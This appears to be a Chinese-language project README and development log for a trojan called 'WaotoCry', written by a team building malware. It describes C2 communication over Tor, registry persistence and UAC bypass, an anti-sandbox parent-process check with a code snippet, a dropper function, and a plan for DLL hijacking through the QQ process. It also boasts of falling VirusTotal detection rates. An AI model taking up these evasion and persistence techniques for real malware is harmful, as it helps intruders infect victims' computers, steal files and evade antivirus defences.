# Walcome To 0x7E9FB Team Project #
![FI](http://oh6kf0af4o.great-site.net/img/painting/87090492_p0_master1200.jpg)
*项目的名字我暂时没有想好，你们可以去想想*

> 写在开头
	
	我们暂时没对PROCESS定型，个人觉得可能算是：
	
	PROCESS NAME:暂定WaotoCry
	PROCESS类型:感染性木马程序
	数据交互渠道:WEB、Socket、TCP、UDP、HTTP
	功能：文件上传\下载,开启Socket5,主机通讯,可能会有文件加密，整个看团队怎么说了
	自毁模块[一旦木马无法与主控联系上便执行自毁]


现在是2021/11/12 1:47:07 我已经对项目完成:


> Bypass.cpp

1. PROCESS对配置文件的AES加密工作[解密先放下]
 
  	 `调用函数--Encryption（char process_path）`
> Encryption.cpp

2. PROCESS对于目标设备进行的维持权限，及BYPASS+AV.[方法还是那个样子，注册表工作就不再说了]

	`调用函数--add_double_data`

	`调用函数--BypassUAC`


WAR:请注意若要对函数进行调用或者其他操作*add_double_data*及*BypassUAC*请把这两个函数当做一个函数，否则将提权失败

> Funtions.cpp


3.PROCESS的生成密码函数.原用于AES解密，但是我觉得有点多余因为文件是属于自己支配，无需目标做什么事.现在正在考虑RSA加密算法公钥/私钥生成行不行，如果不行此函数就要废弃
    `调用函数--Password`
 
> 以上是2021.11.11日的代码


----------


> 2021.11.12日

	[+]新增功能函数Anti Sendbox反沙箱

	Anti SendBox.cpp中
		
	第一步:[函数:Get_Parent_Processid]
	我调用了CreateToolhelp32Snapshot拍摄进程快照
		HMODULE hModule = LoadLibrary(_T("Kernel32.dll"));
		FARPROC Address = GetProcAddress(hModule, "CreateToolhelp32Snapshot");
	然后使用了汇编语句进行传参
		_asm{
		push 0
		push 2
		call Address
		mov hkz, eax
		}
	再使用遍历返回父进程
	
	第二步写一个和上面差不多的结构获取Explorer.exe的PID[函数:Get_Explorer_process_id()]

	最后我让两者的PID进行对比[函数:determine()]
	if(Explorer_id==parent_id)
    如果我的函数在此返回的是--[1]--请各位开发者放行程序，反正请务必终结PROCESS，因为PROCESS已经在被执行逆向工程

	至此反沙箱/OD等逆向工程就写到这里，然后再看实战表现。	

	
 
> 下午11.12日17.38分

	程序现已经通过微步、VirusTotal两个在线云沙箱的考验
	
	成绩汇报:

----------


	微步在线云沙箱

	经微步云沙箱检测该文件为安全 分数:[10分]
	SHA256:9140f4c1bda5d74ac5019f6d3b0ebcb8e6cb9df8eca4ad47df60a96e83f13d3c
	多引擎检出率:1/25
	唯一高危行为:
	潜在进程注入目标explorer.exe
	
	最后分析下，此行为没法躲过去，除非换思路。


----------
	Virustotal

	SHA256:9140f4c1bda5d74ac5019f6d3b0ebcb8e6cb9df8eca4ad47df60a96e83f13d3c
	16 家安全供应商将此文件标记为恶意 多引擎检出率:16/66
	但是经过分析安全厂商未对PROCESS的注册表动作分析，得出PROCESS成功执行反逆向工程
	这里还有一个细节,被标记的安全厂商未有我们熟悉的.反之，阿里、百度、江民、卡巴斯基、迈克菲、微软、趋势科技、深信服零号、腾讯反病毒引擎全部PASS!!!!!!

	2021/11/12 19:17:36 
	空白给予思路，我们放弃对原来的MDD编译思路，换成不从Windows系统调用DLL改从PROCESS自身调用，大大减低触发的安全规则
	新FILE SHA256:5200e993cb05f638655945d6f85abd71db2740446bfa772e12b54cffb60c110d
	多引擎检出率:9/67
	
----------

## 下一步函数功能 ##

> 我在项目创建了一个**Connect.cpp**这个是给你们用于WEB服务器做交互用的

	个人认为你们可以写这些功能:
	1. 向WEB SERVER发起请求--获取公钥[这个公钥是RSA算法的保障，后期可以用作身份校验+文件签名.具有唯一性]
	2. 使用TOR组件通讯，这样我们可以做到--Anonymous--如果WEB组给力点，我们还可以拓展添加一个对TOR的Socket加密通讯
	3. 向SERVER请求下载配置文件
	4. 接收来自Control控制中心的行动指令:upload\upConfig.....
	5. 查看Config文件
	

----------

>反沙箱调试\OD等一切逆向工程

	反沙箱我这有一个很好的思路：我们直接检测PROCESS的父进程是不是Explorer.如果PROCESS进程不是Explorer直接判断程序正在被调试,然后执行EXIT就可以了	
	当然这里想的没那么全,你们看还有没有其他建议，提交--ISSUES--就行

	Attention-->这一步将作为整个项目的核心部分

> PROCESS行为检测

	反逆向模块虽然PASS，但是后期的行为检测也很重要.如果行为检测出问题就代表一切反AV手段全部前功尽弃.
	还是一样的，先说思路。我认为我如果把行为动作做简单高效点，不动高危函数应该没有问题.

> 网络流量检测
> 
	和MAIN SERVER进行的一切交流必须要经过伪装以达到普通进程的目的。这里我说下此函数最后要做成的效果:
	1. 不能暴露MAIN SERVER的IP地址	
	2. 一切通讯被拦截后，无法推断PROCESS的意图


	
## TIME:2021/11/12 17:54:15 完成对此模块的编写并成功PASS ##


----------

----------

> TIME:2021/11/14 11:54:43 
	
	项目的RELEASE[文件释放函数]正式完成
	此函数于11.13中午开始编写，足足卡了我一天的时间，不过好在终于写出来了
	
	函数介绍:
	
	函数名称:CreateEXE(char* strFilePath, int nResourceID, char* strResourceName)
	需要用到的参数名称分别为:文件释放的位置，函数的VS2019资源名称(注:上面的写的是INT类型但是我里面用了MAKEINTRESOURCE进行转型),文件类型.
	
	Use MAKEINTRESOURCE:
	_WaotoCry.get_process_dir= Get_Process_in_dir();
	_WaotoCry.Proconn_data= CreateEXE(_WaotoCry.get_process_dir, IDR_DLL1, (char *)"DLL");
	在Funtions.cpp中我写了一个获取当前目录的函数，这里用结构体中的_WaotoCry.Get_process_dir去接收数据
	CreateEXE里面的就是正式调用


----------

> TIME:2021/11/14 21:00:20 

	此次修改了:
			添加:
				通过进程名寻找PID
				获取PID对应的路径
			修复:
				AITI SENDBOX函数可进行多字节开发,不在限制于UNICDOE字符集.



----------

2021/11/15 0:01:32 
> [Attentions重大事件]经过大佬的反馈，WaotoCry进攻模块将从原来的加载图片RGB值Shellcode变为白EXE+黑DLL方式躲开AV的检查
	
	WaotoCry将通过获取QQ进程PID读取路径进行释放DLL动态链接库，对原DLL进行改写,实现对DLL文件劫持。